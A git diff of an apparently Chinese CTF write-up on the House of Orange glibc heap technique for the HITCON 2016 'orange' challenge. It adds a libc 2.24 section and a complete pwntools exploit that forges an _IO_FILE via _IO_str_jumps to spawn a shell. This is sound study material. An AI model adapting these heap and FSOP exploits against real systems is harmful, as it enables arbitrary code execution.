@@ -13,12 +13,12 @@ tags:
 
 >为了学习"传说中"的House of orange🍊，我去把glibc源码的`malloc.c` `genops.c`关于内存分配和`I/O Operations`的源码研究了一下，梳理了整个流程，我把研究的一些细节的东西写下来，供分享。
 
-## House of orange 概述
+# House of orange 概述
 
 House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。
 
 <span id="House_of_orange"></span>
-## House of orange 原理 
+# House of orange 原理 
 
 如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。
 
@@ -78,12 +78,12 @@ assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
 
 在top chunk进入unsorted bin之后，我们就可以利用`unsorted bin attack`来修改`_IO_list_all`指向我们伪造的`_IO_FILE`，进入下一步攻击。关于`unsorted bin attack `的知识点,详见我的另一篇博文[https://sirhc.xyz/2018/09/06/Unsorted-Bin-Attack-%E7%AC%94%E8%AE%B0/](https://sirhc.xyz/2018/09/06/Unsorted-Bin-Attack-%E7%AC%94%E8%AE%B0/)
 
-<span id="2.23FSOP"></span>
-## glibc2.24以下的FSOP
+<span id="FSOP"></span>
+# FSOP原理
 
 这里简单介绍一下FSOP
 
-FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 [IO_FILE的介绍](https://sirhc.xyz/2018/09/05/%E7%BD%91%E9%BC%8E%E6%9D%AFPwn%E4%B9%8Bblind/#IO_FILE) 得知进程内所有的`_IO_FILE` 结构会使用`_chain` 域相互连接形成一个链表，这个链表的头部由`_IO_list_all` 维护。
+FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 [_IO_FILE利用思路总结](https://sirhc.xyz/2018/12/07/_IO_FILE%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/) 得知进程内所有的`_IO_FILE` 结构会使用`_chain` 域相互连接形成一个链表，这个链表的头部由`_IO_list_all` 维护。
 
 FSOP 的核心思想就是劫持`_IO_list_all` 的值来伪造链表和其中的`_IO_FILE` 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用`_IO_flush_all_lockp`，这个函数会刷新`_IO_list_all` 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用`_IO_FILE_plus.vtable` 中的`_IO_overflow`。
 
@@ -186,7 +186,7 @@ _IO_flush_all_lockp (int do_lock)
 ![](/img/pic/house_of_orange/2.jpg)
 
 <span id="_int_malloc"></span>
-## _ int_malloc()函数解析
+# _ int_malloc()函数解析
 
 nb为传入的分配size大小参数。
 
@@ -421,9 +421,9 @@ while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
 
 
 
-## hitcon-2016 相关PWN题
+# hitcon-2016 相关PWN题
 
-#### 代码分析
+### 代码分析
 
 ![](/img/pic/house_of_orange/4.jpg)
 
@@ -481,7 +481,7 @@ struct house {
 
 ![](/img/pic/house_of_orange/10.jpg)
 
-#### 漏洞利用
+### 漏洞利用
 
 我们在进行漏洞利用的时候会遇到以下困难：
 
@@ -570,7 +570,7 @@ log.info('heap_base:'+hex(heap_base))
 
 UnsortedBin Attack的原理见我的[Unsorted Bin Attack 笔记](https://sirhc.xyz/2018/09/06/Unsorted-Bin-Attack-%E7%AC%94%E8%AE%B0/)
 
-`_IO_FILE`相关的`FSOP`的原理见[glibc2.24以下的FSOP](#2.23FSOP)
+`_IO_FILE`相关的`FSOP`的原理见[FSOP原理](#FSOP)
 
 首先利用UnsortedBin Attack去劫持`_IO_list_all`全局变量，可将`_IO_list_all`更改为`unsorted_bin(av)`，即`main_arena+0x58`。这样当触发`_IO_flush_all_lockp`时，我们可在`main_arena`寻求构造`fake IO_file`结构的机会。
 
@@ -611,7 +611,14 @@ io.sendline(str(1))
 
 ![](/img/pic/house_of_orange/22.jpg)
 
-###### 4.Unexpected
+###### 4.libc_2.24下的利用
+
+参考资料见我的[_IO_FILE利用思路总结](https://sirhc.xyz/2018/12/07/_IO_FILE%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/)
+
+与libc2.23及以下的利用方式有点差距，主要是我们这里利用`__IO_str_jumps`中的`_IO_str_overflow`函数，我们不仅要绕过之前的`_IO_flush_all_lockp`检查，也要绕过`__IO_str_overflow`函数对`_IO_FILE`结构的检查，详细见exp
+
+
+###### 5.Unexpected
 
 该攻击有一定概率失败，主要原因是因为第一次将`_IO_list_all`劫持到`main_arena`时，由于`main_arena`不可控，该内存随机
 
@@ -631,7 +638,7 @@ result = EOF;
 
 如果那两个判断都为假，那他们相或结果为假，根据&&的短路与，就不会执行右边的`_IO_OVERFLOW (fp, EOF) == EOF)`，直接通过`fp = fp->_chain`寻找新的`_IO_file`结构来执行`_IO_OVERFLOW`
 
-#### EXP
+### EXP-libc2.23
 
 ```python
 from pwn import *
@@ -721,6 +728,120 @@ io.sendline(str(1))
 
 io.interactive()
 ```
+
+### EXP-libc2.24
+
+```python
+from pwn import *
+#context(os='linux', arch='amd64', log_level='debug')
+
+io = process('./orange')
+elf = ELF('./orange')
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
+
+IO_file_jumps_offset = libc.sym['_IO_file_jumps']
+IO_str_underflow_offset = libc.sym['_IO_str_underflow']
+for ref_offset in libc.search(p64(IO_str_underflow_offset)):
+    possible_IO_str_jumps_offset = ref_offset - 0x20
+    if possible_IO_str_jumps_offset > IO_file_jumps_offset:
+        print possible_IO_str_jumps_offset
+        break
+
+def build(Length,Name,Price,Choice):
+    io.recvuntil('Your choice : ')
+    io.sendline(str(1))
+    io.recvuntil('name :')
+    io.sendline(str(Length))
+    io.recvuntil('Name :')
+    io.send(Name)
+    io.recvuntil('Orange:')
+    io.sendline(str(Price))
+    io.recvuntil('Color of Orange:')
+    io.sendline(str(Choice))
+
+def see():
+    io.recvuntil('Your choice : ')
+    io.sendline(str(2))
+
+def upgrade(Length,Name,Price,Choice):
+    io.recvuntil('Your choice : ')
+    io.sendline(str(3))
+    io.recvuntil('name :')
+    io.sendline(str(Length))
+    io.recvuntil('Name:')
+    io.send(Name)
+    io.recvuntil('Orange: ')
+    io.sendline(str(Price))
+    io.recvuntil('Color of Orange: ')
+    io.sendline(str(Choice))
+
+
+
+#OverWrite TopChunk
+build(0x80,'AAAA',1,1)
+upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)
+
+#TopChunk->unsorted bin
+build(0x1000,'CCCC',3,3)
+
+#leak libc_base 
+build(0x400,'D'*8,4,4)
+see()
+io.recvuntil('Name of house : DDDDDDDD')
+libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
+print "libc_base : " +hex(libc_base)
+system_addr = libc_base+libc.symbols['system']
+log.info('system_addr:'+hex(system_addr))
+IO_list_all = libc_base+libc.symbols['_IO_list_all']
+log.info('_IO_list_all:'+hex(IO_list_all))
+_IO_str_jumps=libc_base+possible_IO_str_jumps_offset
+print "possible_IO_str_jumps_offset : "+hex(_IO_str_jumps)
+
+
+
+
+#leak heap_base
+upgrade(0x400,'E'*0x10,5,5)
+see()
+io.recvuntil('Name of house : ')
+io.recvuntil('E'*0x10)
+heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
+log.info('heap_base:'+hex(heap_base))
+
+
+# unsortedbin attack ,Fsop
+
+binsh_addr = heap_base +0x140
+
+pad ="/bin/sh\x00"   # binsh 地址
+pad = pad.ljust(0x410,"\x00")
+pad += p32(6)+p32(6)+p64(0)
+
+stream = p64(0)+p64(0x61)  # fp->_flags为0   
+stream += p64(0xddaa)+p64(IO_list_all-0x10)
+stream +=p64(1)+p64(0x7ffffffffffd) # (fp->_IO_write_ptr - fp->_IO_write_base )是一个很大的正值,远大于(fp->_IO_buf_end - fp->_IO_buf_base)
+stream +=p64(0)
+stream +=p64(0)+p64((binsh_addr-100)/2)  # fp->_IO_buf_base=0 ,  fp->_IO_buf_end=(binsh_addr-100)/2
+stream = stream.ljust(0xc0,"\x00")
+stream += p64(0) # mode<=0
+stream += p64(0)
+stream += p64(0)
+stream += p64(_IO_str_jumps)
+stream = stream.ljust(0xe0,"\x00")
+stream +=p64(system_addr)
+
+payload = pad + stream
+
+upgrade(0x800,payload,6,3)
+#raw_input()
+#gdb.attach(io)
+io.recvuntil('Your choice : ')
+io.sendline(str(1))
+
+io.interactive()
+
+```
+
 执行结果看下图：
 
 ![](/img/pic/house_of_orange/23.jpg)
